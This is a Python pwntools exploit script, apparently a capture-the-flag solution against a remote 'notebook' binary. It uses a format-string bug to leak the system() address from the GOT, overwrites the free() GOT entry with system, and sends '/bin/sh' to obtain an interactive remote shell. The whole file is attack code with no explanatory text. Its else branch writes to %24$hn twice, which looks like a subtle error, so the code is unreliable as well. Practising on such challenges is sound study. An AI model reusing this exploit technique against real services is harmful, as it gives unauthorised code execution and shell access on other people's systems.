# -*- coding: utf-8 -*-
from pwn import *
'''
格式化字符串
'''
context(log_level='debug')

#p = process("./notebook")
p = remote("111.198.29.45",53001)
elf = ELF("./notebook")

#gdb.attach(p, 'b * 0x080486e2')
read_addr = elf.got["system"]
write_addr = elf.got["free"]
globallength = 0x0804a06c


# %26$n to modify 0x0804a06c
# %25$s to leak system
payload = 'a'*6+r"%25$s"+'a'*5+p32(read_addr)+p32(globallength)+r"%26$n"
p.sendline(payload)
p.recvuntil("May I have your name?\n")
p.recv(6)
system = u32(p.recv(4))

write_value = system
log.success("system:"+hex(system))

high = (write_value/(2**16))
low = (write_value%(2**16))

print(high)
print(low)

if high>low:
    payload = "/bin/sh"+chr(22)+p32(write_addr)+p32(write_addr+2)\
                +"%"+str(low-0x10)+"x"+"%23$hn"\
                +"%"+str(high-low)+"x"+"%24$hn"
    p.sendline(payload)
else:
    payload = "/bin/sh"+chr(22)+p32(write_addr)+p32(write_addr+2)\
                +"%"+str(high-0x10)+"x"+"%24$hn"\
                +"%"+str(low-high)+"x"+"%24$hn"
    p.sendline(payload)


p.interactive()
